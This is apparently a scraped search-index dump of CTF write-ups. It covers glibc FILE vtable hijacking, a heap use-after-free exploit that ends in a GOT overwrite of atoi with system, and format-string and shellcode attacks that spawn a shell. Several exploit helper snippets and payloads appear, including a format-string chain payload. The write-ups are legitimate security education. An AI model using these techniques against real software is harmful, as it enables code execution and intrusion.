stores the pointer to the needed IO helper methods. _IO_jump_t struct _IO_jump_t { JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_s","date":"Nov 01, 2022","objectID":"/posts/file-structure-attack-part-1/:2:0","tags":["Education","FILE"],"title":"FILE Structure Attack: Part 1","uri":"/posts/file-structure-attack-part-1/"},{"categories":null,"content":"The usage of vtable in a FILE structure To give an example of how the IO Operations work and how the vtable will be used, let‚Äôs take a look at what will happen when we call exit() in the below C program. #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e int main() { exit(1337); } What will happen when the binary executes the exit? Will IO operations take part in it? Let‚Äôs take a look at the glibc implementation (version 2.35) and try to follow the calls (I will skip some LOCs because I only want to showcase how the vtable will be used). exit void exit (int status) { __run_exit_handlers (status, \u0026__exit_funcs, true, true); } Okay, it turns out that exit will call __run_exit_handlers. Let‚Äôs move into that method. __run_exit_handlers /* Call all functions registered with `atexit' and `on_exit', in the reverse of the order in which they were registered perform stdio cleanup, and terminate program execution with STATUS. */ void attribute_hidden __run_exit_handlers (int status, struct exit_function_list **listp, bool run_list_atexit, bool run_dtors) { ... if (run_list_atexit) RUN_HOOK (__libc_atexit, ()); ... } Focusing on that LOC, What does it do? Inspecting the compiled binary via gdb, turn out it will call _IO_cleanup gef‚û§ disas __run_exit_handlers ... 0x00007ffff7a4a1fd \u003c+125\u003e: lea rbp,[rip+0x383694] # 0x7ffff7dcd898 \u003c__elf_set___libc_atexit_element__IO_cleanup__\u003e ... gef‚û§ disas __elf_set___libc_atexit_element__IO_cleanup__ Dump of assembler code for function _IO_cleanup: _IO_cleanup int _IO_cleanup (void) { /* We do *not* want locking. Some threads might use streams but that is their problem, we flush them underneath them. */ int result = _IO_flush_all_lockp (0); /* We currently don't have a reliable mechanism for making sure that C++ static destructors are executed in the correct order. So it is possible that other static destructors might want to write to cout - and they're supposed to be able to do so. The following will make the standard streambufs be unbuffered, which forces any output from late destructors to be written out. */ _IO_unbuffer_all (); return result; } What will _IO_flush_all_lockp do? _IO_flush_all_lockp int _IO_flush_all_lockp (int do_lock) { ... last_stamp = _IO_list_all_stamp; fp = (_IO_FILE *) _IO_list_all; while (fp != NULL) { run_fp = fp; if (do_lock) _IO_flockfile (fp); if (((fp-\u003e_mode \u003c= 0 \u0026\u0026 fp-\u003e_IO_write_ptr \u003e fp-\u003e_IO_write_base) #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 \u0026\u0026 fp-\u003e_mode \u003e 0 \u0026\u0026 (fp-\u003e_wide_data-\u003e_IO_write_ptr \u003e fp-\u003e_wide_data-\u003e_IO_write_base)) #endif ) \u0026\u0026 _IO_OVERFLOW (fp, EOF) == EOF) result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; if (last_stamp != _IO_list_all_stamp) { /* Something was added to the list. Start all over again. */ fp = (_IO_FILE *) _IO_list_all; last_stamp = _IO_list_all_stamp; } else fp = fp-\u003e_chain; } ... } Some notes that you could take from reading those LOCs: _IO_flush_all_lockp will iterate all available FILE (iterating from the FILE linked list header stored in the _IO_list_all). If meeting certain conditions, it will call _IO_OVERFLOW (fp, EOF) Remember that _IO_OVERFLOW (fp, EOF) means that it will try to do the call by jumping to the stored pointer in the fp.vtable[__overflow]. This is one of the examples of how the vtable in a FILE object will be used, and this kind of IO operation happens in other methods as well, not limited to exit. N.B. If you try to explore more by yourself, in the method _IO_unbuffer_all which is also called during _IO_cleanup, you will notice that there is a vtable call as well, which is _IO_SETBUF (fp, NULL, 0); Possible Attack Scenario Taking an example from the above scenario on how IO operation works inside the exit call of C library, there are some possible attack scenarios that we can do to abuse the FILE structure: Hijack the vtable of the IO file (For example, stdout). Remember that when we call exit in the above example, it will iterate the FILE linked list, and if some constraint","date":"Nov 01, 2022","objectID":"/posts/file-structure-attack-part-1/:3:0","tags":["Education","FILE"],"title":"FILE Structure Attack: Part 1","uri":"/posts/file-structure-attack-part-1/"},{"categories":null,"content":" BlackHat MEA CTF 2022 Quals Final Scoreboard During this weekend, I played BlackHat MEA CTF 2022 with my team Fidethus. We managed to secure the 12th position on this CTF. Here are some of my write-ups for challenges that I solved during the CTF. pwn ","date":"Oct 02, 2022","objectID":"/posts/blackhat-mea-ctf-2022/:0:0","tags":["Writeup","BlackHat","pwn","heap","unsorted bin","fastbin"],"title":"BlackHat MEA CTF 2022","uri":"/posts/blackhat-mea-ctf-2022/"},{"categories":null,"content":"Robot Factory ","date":"Oct 02, 2022","objectID":"/posts/blackhat-mea-ctf-2022/:1:0","tags":["Writeup","BlackHat","pwn","heap","unsorted bin","fastbin"],"title":"BlackHat MEA CTF 2022","uri":"/posts/blackhat-mea-ctf-2022/"},{"categories":null,"content":"Initial Analysis Let‚Äôs start by checking the binary via checksec. Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Okay, so the binary is No PIE and Partial RELRO. This will help a lot! Now, let‚Äôs check the given Dockerfile FROM ubuntu:18.04 RUN apt-get update \u0026\u0026 apt-get -y upgrade RUN useradd -d /home/task/ -m -p task -s /bin/bash task RUN echo \"task:task\" | chpasswd WORKDIR /home/task COPY main . COPY flag.txt . COPY ynetd . COPY run.sh . RUN chown -R root:root /home/task RUN chmod 755 ynetd RUN chmod 755 main RUN chmod 777 flag.txt RUN chmod 755 run.sh USER task CMD [\"./run.sh\"] Okay, so the challenge is running in Ubuntu 18.04, and it uses libc-2.27 as the glibc version. Now, let‚Äôs try to analyze the binary by disassembling it. robots_factory undefined8 robots_factory(void) { int iVar1; puts(\"Welcome to the secret robots factory!\"); while( true ) { menu(); iVar1 = read_int(); if (iVar1 == 4) break; if (iVar1 \u003c 5) { if (iVar1 == 3) { destroy_robot(); } else if (iVar1 \u003c 4) { if (iVar1 == 1) { new_robot(); } else if (iVar1 == 2) { program_robot(); } } } } return 0; } We can see that the binary only gave us 3 menus, new, program, and destroy. Let‚Äôs check those methods. new_robot void new_robot(void) { int iVar1; void *pvVar2; long in_FS_OFFSET; uint local_20; char local_15 [5]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); if (number_robots \u003c 5) { puts(\"Provide robot memory size:\"); read(0,local_15,4); iVar1 = atoi(local_15); if (iVar1 \u003c 0x101) { puts(\"you\\'re creating a stupid robot.\"); } else { for (local_20 = 0; (int)local_20 \u003c 5; local_20 = local_20 + 1) { if (*(int *)(check_robot_slot + (long)(int)local_20 * 4) == 0) { pvVar2 = calloc(1,(long)iVar1); *(void **)(robots + (long)(int)local_20 * 8) = pvVar2; *(undefined4 *)(check_robot_slot + (long)(int)local_20 * 4) = 1; *(int *)(robot_memory_size + (long)(int)local_20 * 4) = iVar1; printf(\"You got new page at index %d\\n\",(ulong)local_20); number_robots = number_robots + 1; break; } } } } else { puts(\"All slots are occupied :(\"); } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; } We can notice some interesting notes from that method: The max size of the total active allocated chunks is only 5 We can only allocate chunks with size larger than 0x101, and based on the atoi method, the size is limited to 4 digits (which means the max value is 9999) Instead of malloc, it uses calloc. We will discuss the key differences later. The allocated chunk (we call it as robot) address is stored in global variable robots The size of the robot is also stored in a global variable called robot_memory_size. There is also a global variable called check_robot_slot which will be assigned to 1 if we create a new robot There‚Äôs also number_robots global variable, which will count how many robot we‚Äôve created. So far, we didn‚Äôt see any bugs. Let‚Äôs move to the other methods. destroy_robot void destroy_robot(void) { int iVar1; long in_FS_OFFSET; char local_15 [5]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); puts(\"Provide robot\\'s slot:\"); read(0,local_15,4); iVar1 = atoi(local_15); if ((iVar1 \u003c 0) || (4 \u003c iVar1)) { puts(\"Slot is empty!\"); } else if (*(int *)(check_robot_slot + (long)iVar1 * 4) == 0) { puts(\"robot doesn\\'t exist!\"); } else { free(*(void **)(robots + (long)iVar1 * 8)); *(undefined4 *)(check_robot_slot + (long)iVar1 * 4) = 0; number_robots = number_robots + -1; } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; } Notice that this destroys robot only nullify the check_robot_slot flag, but doesn‚Äôt null the robots pointer. This might be a bug. program_robot void program_robot(void) { int iVar1; long in_FS_OFFSET; char local_15 [5]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); puts(\"Provide robot\\'s slot:\"); read(0,local_15,4); iVar1 = atoi(local_15); if ((iV","date":"Oct 02, 2022","objectID":"/posts/blackhat-mea-ctf-2022/:1:1","tags":["Writeup","BlackHat","pwn","heap","unsorted bin","fastbin"],"title":"BlackHat MEA CTF 2022","uri":"/posts/blackhat-mea-ctf-2022/"},{"categories":null,"content":"Exploitation Plan Now that we‚Äôve known that there is a UAF bug, let‚Äôs summarize our findings so far: GLIBC version is 2.27 That means there is tcache bin, and every time we free a chunk with size \u003c 0x401, it will go to tcache bin first until it fulls When the tcache bin is full, based on its size, it will go to either unsortedbin or fastbin. By default, if the size is larger than 0x80, it will go to unsortedbin. Else, it will go to fastbin. It uses calloc instead of malloc What makes it differs is that calloc doesn‚Äôt use tcache bin at all. But, it can use fastbin or unsortedbin. So, if we free a chunk and it goes to tcache, if we call calloc again with the same freed size, it won‚Äôt use the tcache. Instead, it will create a new chunk. No PIE and Partial Relro, which means we can overwrite GOT easily as the address is fixed (Only if we can create arbitrary write primitive). There is a UAF bug in the program, which allow us to edit freed chunk. The minimum allocation is 0x101, which means it will go to either tcache or unsortedbin. Based on that summary, let‚Äôs try to think about how should we attack this binary. After reading a lot of resources on the internet and thinking for a while, I found a working plan that could work. First, let‚Äôs examine the global variable structure (To find the address, you can use gdb vmmap command to find the rw area of the binary) gef‚û§ x/38gx 0x00000000404000 0x404000: 0x0000000000403e20 0x00007ffff7ffe170 0x404010: 0x00007ffff7dea8f0 0x0000000000401030 0x404020 \u003cputs@got.plt\u003e: 0x00007ffff7a62970 0x00007ffff7af20f0 0x404030 \u003c__stack_chk_fail@got.plt\u003e: 0x0000000000401060 0x0000000000401070 0x404040 \u003cread@got.plt\u003e: 0x00007ffff7af2020 0x0000000000401090 0x404050 \u003csetvbuf@got.plt\u003e: 0x00007ffff7a632a0 0x00000000004010b0 0x404060: 0x0000000000000000 0x0000000000000000 0x404070: 0x0000000000000000 0x0000000000000000 0x404080 \u003cstdout@@GLIBC_2.2.5\u003e: 0x00007ffff7dce760 0x0000000000000000 0x404090 \u003cstdin@@GLIBC_2.2.5\u003e: 0x00007ffff7dcda00 0x0000000000000000 0x4040a0 \u003cstderr@@GLIBC_2.2.5\u003e: 0x00007ffff7dce680 0x0000000000000000 0x4040b0: 0x0000000000000000 0x0000000000000000 0x4040c0 \u003crobot_memory_size\u003e: 0x0000000000000000 0x0000000000000000 0x4040d0 \u003crobot_memory_size+16\u003e: 0x0000000000000000 0x0000000000000000 0x4040e0 \u003ccheck_robot_slot\u003e: 0x0000000000000000 0x0000000000000000 0x4040f0 \u003ccheck_robot_slot+16\u003e: 0x0000000000000000 0x0000000000000000 0x404100 \u003crobots\u003e: 0x0000000000000000 0x0000000000000000 0x404110 \u003crobots+16\u003e: 0x0000000000000000 0x0000000000000000 0x404120 \u003crobots+32\u003e: 0x0000000000000000 0x0000000000000000 Notice that the robots array is located at a higher address. If we‚Äôre somehow able to forge our good-sized chunk location so that it points to the area of robot_memory_size or check_robot_slot, we will be able to create an arbitrary write primitive, because if we call program_robot on that chunk, it will be able to edit robots array as well, where we can simply fill one of the elements with the target address that we want to overwrite, and then use program_robot again on the overwritten index to do arbitrary write. Also because it is No PIE, the address is fixed, so we don‚Äôt need a leak. Now moving to the next question, how can we forge a chunk so that it points to the global variable area? Remember that calloc doesn‚Äôt use tcache at all so that we can‚Äôt poison tcache pointers. We left with forging the metadata of fastbin chunk, but due to the limitation where we can only allocate chunk with size larger than 0x101, we can‚Äôt free chunk to the fastbin (It will go to unsortedbin). After reading resources, turn out fastbin has a variable called global_max_fast, which stored the maximum size of a chunk that can be freed to fastbin. So, we need a way to change this value, so that if we free chunk with size larger than 0x80 (the default value stored), it will go to fastbin. The trick here is to perform unsorted bin attack. You can find this attack in how2heap repo and this blog. To give more explanation, le","date":"Oct 02, 2022","objectID":"/posts/blackhat-mea-ctf-2022/:1:2","tags":["Writeup","BlackHat","pwn","heap","unsorted bin","fastbin"],"title":"BlackHat MEA CTF 2022","uri":"/posts/blackhat-mea-ctf-2022/"},{"categories":null,"content":"Detailed Solution Now, based on those rough plans, let‚Äôs try to do detailed steps on how will we exploit this. To make our life easier, let‚Äôs try to create a helper first def create(r, size): r.sendlineafter(b'\u003e ', b'1') r.sendlineafter(b'size:\\n', str(size).encode()) def edit(r, idx, payload): r.sendlineafter(b'\u003e ', b'2') r.sendlineafter(b'slot:', str(idx).encode()) r.sendafter(b'robot:', payload) def free(r, idx): r.sendlineafter(b'\u003e ', b'3') r.sendlineafter(b'slot:', str(idx).encode()) After that, let‚Äôs prepare some offset that we will use later during doing GOT overwriting. # Due to no leak, we need to bruteforce so that this solution will work only if the last two bytes # of the libc base is 00 00 (0x0000) global_max_fast = 0xd940 # This is the only offset that will work system_offset = 0xf420 # This is the only offset that will work Remember that we don‚Äôt have any leaks, so brute forcing is required. In this solution, we plan to overwrite atoi GOT address with system offset. The assumption is that this solution will work only and only if: The libc base address two least significant bytes is 0x0000. For example 0x007ffff79e0000 will work. Only if the base address fulfills those criteria that our solution will be able to work. Why? Because on libc 2.27: The Offset of atoi is 0x40670 The Offset of system is 0x4f420 If the libc base address two least significant bytes starting with 0x0000, then we can partially overwrite two bytes of the GOT entry of atoi. For example, if the base starts with 0x1000, that means the atoi address will be 0x41670, and system is 0x50420. Notice that if we overwrite two bytes of the atoi with 0x0420, it will become 0x40420, and it isn‚Äôt the correct address for system Now we have found the correct offset, let‚Äôs move to the heap exploitation. # Fill tcache[0x110] until it got full tcache_size = 0x108 offset_increment = 0x260 # Based on gdb observation, when we create the first chunk, the offset will be heap_offset + 0x260 for i in range(7): # We can do this because calloc doesn't use tcache create(r, tcache_size) free(r, 0) log.info(\"Fulfill tcache...\") pause() Our target is to fulfill the tcache[0x110] bin. Because calloc doesn‚Äôt use tcache, we can simply repeatedly create and free to fulfill the tcache. Let‚Äôs check on gdb gef‚û§ heap bins tcache ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Tcachebins for thread 1 ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Tcachebins[idx=15, size=0x110, count=7] ‚Üê Chunk(addr=0x4058c0, size=0x110, flags=PREV_INUSE) ‚Üê Chunk(addr=0x4057b0, size=0x110, flags=PREV_INUSE) ‚Üê Chunk(addr=0x4056a0, size=0x110, flags=PREV_INUSE) ‚Üê Chunk(addr=0x405590, size=0x110, flags=PREV_INUSE) ‚Üê Chunk(addr=0x405480, size=0x110, flags=PREV_INUSE) ‚Üê Chunk(addr=0x405370, size=0x110, flags=PREV_INUSE) ‚Üê Chunk(addr=0x405260, size=0x110, flags=PREV_INUSE) And yup, tcache is full now. Let‚Äôs move to the next step, which is trying to overwrite global_max_fast value. # Create two chunk with size 0x108 # These will be used later for i in range(2): create(r, tcache_size) # Create huge chunk max_size = 0x2700 create(r, max_size) # Create small chunk, so that when we free huge chunk, it won't get consolidated create(r, 0x111) # This will be used as fake chunk later. We need to set the size to 0x111 free(r, 2) # Go to unsorted bin log.info(\"Now we have unsorted bin chunk\") Now, what we do: Create 2 small chunks with size 0x108, so that later when we freed this, it will go to fastbin when we have overwritten the global_max_fast. Create a huge chunk with size 0x2700. Later, when we free this, it will go to unsortedbin. Create two more small chunks just below the huge chunk with size specifically 0x111 for 2 reasons: So that when we free the huge chunk, it won‚Äôt be consolidated. So that the last entry of robot_memory_size will store value 0x111. This will be important later when we want to create the arbitrary write primitive. Let‚Äôs check in gdb: gef‚û§ heap bins unsorted ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ","date":"Oct 02, 2022","objectID":"/posts/blackhat-mea-ctf-2022/:1:3","tags":["Writeup","BlackHat","pwn","heap","unsorted bin","fastbin"],"title":"BlackHat MEA CTF 2022","uri":"/posts/blackhat-mea-ctf-2022/"},{"categories":null,"content":" During this weekend, I played MapleCTF 2022 with my team idek. We managed to secure the 5th position on this CTF. Here is my write-up for some challenges that I solved during the CTF. Pwn ","date":"Aug 29, 2022","objectID":"/posts/maplectf-2022/:0:0","tags":["Writeup","MapleCTF","pwn","format string","shellcode"],"title":"MapleCTF 2022","uri":"/posts/maplectf-2022/"},{"categories":null,"content":"printf On this challenge, we were given a binary called chal. ","date":"Aug 29, 2022","objectID":"/posts/maplectf-2022/:1:0","tags":["Writeup","MapleCTF","pwn","format string","shellcode"],"title":"MapleCTF 2022","uri":"/posts/maplectf-2022/"},{"categories":null,"content":"Initial Analysis Let‚Äôs start by checking the binary via checksec. Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Okay, so the binary is PIE and Full RELRO. Now, let‚Äôs try to analyze the binary by disassembling it. main undefined8 main(void) { alarm(0x3c); setbuf(stdout,(char *)0x0); setbuf(stdin,(char *)0x0); ready(); return 0; } ready void ready(void) { set(); return; } set void set(void) { go(); return; } go long go(void) { int iVar1; undefined4 extraout_var; fgets(s,0x100,stdin); iVar1 = printf(s); return CONCAT44(extraout_var,iVar1); } Ah, okay looking at the go() method, there is a format string bug. But that‚Äôs it, we don‚Äôt have any leak (which we need), and yet we were only given one chance to do the format string. ","date":"Aug 29, 2022","objectID":"/posts/maplectf-2022/:1:1","tags":["Writeup","MapleCTF","pwn","format string","shellcode"],"title":"MapleCTF 2022","uri":"/posts/maplectf-2022/"},{"categories":null,"content":"Exploitation Plan Let‚Äôs start by trying to check the stack just before we call the printf method by gdb. We can see some interesting values here. The stack contains a libc address (to be precise __libc_start_main+243), and the stack address itself (We can see saved rbp of method go(), set(), and ready()). Our target is to pop a shell with the format string bug, and one printf won‚Äôt be enough for us. So, the plan is: Thinking about how to send our input and call printf multiple times, so that we will be more versatile on the exploit Try to leak the libc base address, and then calculate the execve address (via one_gadget). Overwrite one of the saved return pointers to the calculated address, so that it will pop a shell. ","date":"Aug 29, 2022","objectID":"/posts/maplectf-2022/:1:2","tags":["Writeup","MapleCTF","pwn","format string","shellcode"],"title":"MapleCTF 2022","uri":"/posts/maplectf-2022/"},{"categories":null,"content":"Solution To execute our plan, let‚Äôs try to use one_gadget first. I did a little bit of guessing, where based on the previous challenge called warmup2, I guessed that the libc version will be the same as my local (Ubuntu 20.04). So let‚Äôs try to do one_gadget on it. one_gadget '/usr/lib/x86_64-linux-gnu/libc-2.31.so' 0xe3afe execve(\"/bin/sh\", r15, r12) constraints: [r15] == NULL || r15 == NULL [r12] == NULL || r12 == NULL 0xe3b01 execve(\"/bin/sh\", r15, rdx) constraints: [r15] == NULL || r15 == NULL [rdx] == NULL || rdx == NULL 0xe3b04 execve(\"/bin/sh\", rsi, rdx) constraints: [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL I‚Äôll use the 0xe3b01 as the offset of our pop shell address, because based on observation in GDB, the r15 and rdx will be null, so it has fulfilled the constraints. Now, we know that: Via format string, we can leak the libc base address We have the gadget address of execve, which means we know the value that we need to write to one of the saved return pointers Let‚Äôs try to check the stack layout gef‚û§ tele 0x007fffffffdbc0‚îÇ+0x0000: 0x007fffffffdbd0 ‚Üí 0x007fffffffdbe0 ‚Üí 0x007fffffffdbf0 ‚Üí 0x0000000000000000 ‚Üê $rsp, $rbp 0x007fffffffdbc8‚îÇ+0x0008: 0x005555555551f2 ‚Üí \u003cset+18\u003e nop 0x007fffffffdbd0‚îÇ+0x0010: 0x007fffffffdbe0 ‚Üí 0x007fffffffdbf0 ‚Üí 0x0000000000000000 0x007fffffffdbd8‚îÇ+0x0018: 0x00555555555207 ‚Üí \u003cready+18\u003e nop 0x007fffffffdbe0‚îÇ+0x0020: 0x007fffffffdbf0 ‚Üí 0x0000000000000000 0x007fffffffdbe8‚îÇ+0x0028: 0x0055555555524e ‚Üí \u003cmain+68\u003e mov eax, 0x0 0x007fffffffdbf0‚îÇ+0x0030: 0x0000000000000000 0x007fffffffdbf8‚îÇ+0x0038: 0x007ffff7ddd083 ‚Üí \u003c__libc_start_main+243\u003e mov edi, eax Notice that the stack value in 0x007fffffffdbf8 is already pointing to the libc region. So, it is clear that we can just overwrite the last 3 bytes of the stored value with our calculated gadget address, but to do it, we need a way to repeat the go() method multiple times, so that we can overwrite the saved return pointer with our desired value. The idea is that the saved rbp of set(), which is located in the 0x007fffffffdbd0 is pointing to another stack address 0x007fffffffdbe0. If we‚Äôre able to overwrite the value stored in 0x007fffffffdbe0 with our desired address, we will be able to use it as our gadget to overwrite the stored pointer. For example: With format string attack, we overwrite the LSB of the value pointed by 0x007fffffffdbd0 with 0xc8. That means the stored value inside 0x007fffffffdbe0 will be changed from 0x007fffffffdbf0 to 0x007fffffffdbc8. Now, it points to the saved return pointer of the go() method. And then using the format string attack again, if we overwrite the LSB of the value pointed by 0x007fffffffdbe0, that means the value stored inside 0x007fffffffdbc8 will be overwritten, which means we now control our program execution flow. So, based on the above example, it is clear that the goal of our first format string loop is: Overwrite the 8th param pointed address last byte with 0xc8 (8th param is 0x007fffffffdbd0, pointing to 0x007fffffffdbe0, so what we overwrite is the value stored inside 0x007fffffffdbe0). After that, overwrite the 10th param pointed address last byte with 0xed(10th param is 0x007fffffffdbe0, which due to the first payload, is now pointing to the saved return pointer of go() :D). Now, the go() will return to set() and the set() will call go() again. We successfully create the loop. Also, don‚Äôt forget to leak the libc address and stack address as well in the first payload. So, the first loop payload is %c%c%c%c%c%c%50x%hhn%181x%hhn||%6$p.%7$p.%13$p. One of the important note is that, if we want to do a chain overwrite like this, we aren‚Äôt allowed to use any positional parameter at the beginning of it, because when printf see the first positional argument, it will copy the needed arguments to its buffer, so that we won‚Äôt be able to do the chain because the next positional argument will refer to the copied buffer, not the overwritten value. For example, if we‚Äôre not spamming %c, and instead do ","date":"Aug 29, 2022","objectID":"/posts/maplectf-2022/:1:3","tags":["Writeup","MapleCTF","pwn","format string","shellcode"],"title":"MapleCTF 2022","uri":"/posts/maplectf-2022/"},{"categories":null,"content":"Puzzling Oversight We were given a binary called puzzling-oversight and a Dockerfile. Reading through the Dockerfile, the challenge was running under Ubuntu 22.04. ","date":"Aug 29, 2022","objectID":"/posts/maplectf-2022/:2:0","tags":["Writeup","MapleCTF","pwn","format string","shellcode"],"title":"MapleCTF 2022","uri":"/posts/maplectf-2022/"},{"categories":null,"content":"Initial Analysis Let‚Äôs start by checksec the binary first. Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RWX: Has RWX segments Hmm RWX segments? Let‚Äôs try to run the binary in gdb and check its memory. gef‚û§ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x00555f0e89f000 0x00555f0e8a0000 0x00000000000000 r-- /home/chovid99/ctf/puzzling/puzzling-oversight 0x00555f0e8a0000 0x00555f0e8a1000 0x00000000001000 r-x /home/chovid99/ctf/puzzling/puzzling-oversight 0x00555f0e8a1000 0x00555f0e8a2000 0x00000000002000 r-- /home/chovid99/ctf/puzzling/puzzling-oversight 0x00555f0e8a2000 0x00555f0e8a3000 0x00000000002000 r-- /home/chovid99/ctf/puzzling/puzzling-oversight 0x00555f0e8a3000 0x00555f0e8a4000 0x00000000003000 rwx /home/chovid99/ctf/puzzling/puzzling-oversight Ah, turn out the .bss is executable. Let‚Äôs try to run the given binary first so that we gain some knowledge about it. ./puzzling-oversight Welcome to the Number Flipper(TM) game v7.27! Options: 1 - play the game 2 - display how to play this game 3 - display game stats 4 - quit \u003e 2 How to play this game: You are given 8 random hexadecimal numbers, which you can increment by any amount (it will wrap around if it's too big); However, the catch is doing so also affects the numbers directly next to it! Your goal is to flip all the numbers to 0s. That's it - simple, right? Options: 1 - play the game 2 - display how to play this game 3 - display game stats 4 - quit \u003e 3 You have won 0 times in the current session. Keep going! Options: 1 - play the game 2 - display how to play this game 3 - display game stats 4 - quit \u003e 1 Board: 4b40 6451 55f4 d4f4 3c8f d13f 76f4 a891 Your move (0 to quit) \u003e 3 Increment how much? \u003e 1 Board: 4b40 6452 55f5 d4f5 3c8f d13f 76f4 a891 Your move (0 to quit) \u003e 0 Seeing through the interaction, the first menu is the only menu that can we use to write something to the memory. The rest isn‚Äôt useful. And based on the printed rules, we can see that: Each time we choose an index called idx to be incremented, the value stored in idx-1 and idx+1 will be incremented also. Seems like, the maximum value per index is 0xffff, and it will wrap around when the value gets bigger than that. Let‚Äôs start disassembling the binary. The binary method was stripped, but I‚Äôve renamed it to make it clearer. main void main(void) { int iVar1; alarm(0x3c); setbuf(stdout,(char *)0x0); setbuf(stdin,(char *)0x0); _DAT_00104060 = menu_play; _DAT_00104068 = menu_rule; _DAT_00104070 = menu_stats; _DAT_00104078 = menu_quit; puts(\"Welcome to the Number Flipper(TM) game v7.27!\\n\"); do { do { puts(\"Options:\"); puts(\"1 - play the game\"); puts(\"2 - display how to play this game\"); puts(\"3 - display game stats\"); puts(\"4 - quit\\n\"); printf(\"\u003e \"); fflush(stdout); iVar1 = read_input(1,4); } while ((long)iVar1 == -1); putchar(10); (**(code **)(\u0026DAT_00104060 + ((long)iVar1 + -1) * 8))(); putchar(10); } while( true ); } From the main menu, notice that: Each of the menu function handler‚Äôs pointers is stored under the .bss section During each input in the main menu, the main will call the stored pointer inside the .bss variables based on the input. We just need to check the first menu, because it‚Äôs the only important menu that needs to be audited. main_play void menu_play(void) { int iVar1; time_t tVar2; long lVar3; int local_38; int local_34; tVar2 = time((time_t *)0x0); srand((uint)tVar2); local_38 = 4; while (local_38 != 0) { iVar1 = rand(); (\u0026DAT_00104050)[local_38 + -1] = iVar1; local_38 = local_38 + -1; } while ((((DAT_00104050 != 0 || (DAT_00104054 != 0)) || (DAT_00104058 != 0)) || (DAT_0010405c != 0) )) { printf(\"Board: \"); local_34 = 8; while (local_34 != 0) { printf(\"%04x \",(ulong)*(ushort *)((long)\u0026DAT_00104050 + (long)(local_34 + -1) * 2)); local_34 = local_34 + -1; } printf(\"\\nYour move (0 to quit) \u003e \"); fflush(stdout); iVar1 = read_input(0); lVar3 = (long)iVar1; if (lVar3 != -1) { if (lVar3 == 0) { return; } printf(\"Increment how m","date":"Aug 29, 2022","objectID":"/posts/maplectf-2022/:2:1","tags":["Writeup","MapleCTF","pwn","format string","shellcode"],"title":"MapleCTF 2022","uri":"/posts/maplectf-2022/"},{"categories":null,"content":"Exploitation Plan From our initial analysis, the important notes that we took: .bss is RWX We can freely control the board value via the increment method And somehow, there is a bug in the board value‚Äôs assignment, which allowed us to replace the last 4 bytes of the menu_play method. So, the idea for solving this challenge is we need to somehow control the increment so that two conditions will be fulfilled, which are: Change the board value to our desired shellcode Change the stored menu_play pointer to the board address (Because it is RWX), so that if we call menu_play, it will run our desired shellcode If the above conditions are fulfilled, the next time we try to call the menu_play‚Äôs method for the board‚Äôs game, it will give us a shell instead. ","date":"Aug 29, 2022","objectID":"/posts/maplectf-2022/:2:2","tags":["Writeup","MapleCTF","pwn","format string","shellcode"],"title":"MapleCTF 2022","uri":"/posts/maplectf-2022/"},{"categories":null,"content":"Solution First, we need to solve the puzzle. We need to create a script to determine the correct increment on each index so that the board address will contain our desired value. How to create the script? Well, just use z3 to do it xD. Luckily, during the competition, my teammate daeMOn was sharing his script to complete the z3 logic. Let‚Äôs say that our target value is 1337 beef 1337 beef 1337 beef 1337 beef, and the initial value is beef 1337 beef 1337 beef 1337 beef 1337. We can convert this to z3 equations, where: # Below is the total increment on each index that we want to find x1 = 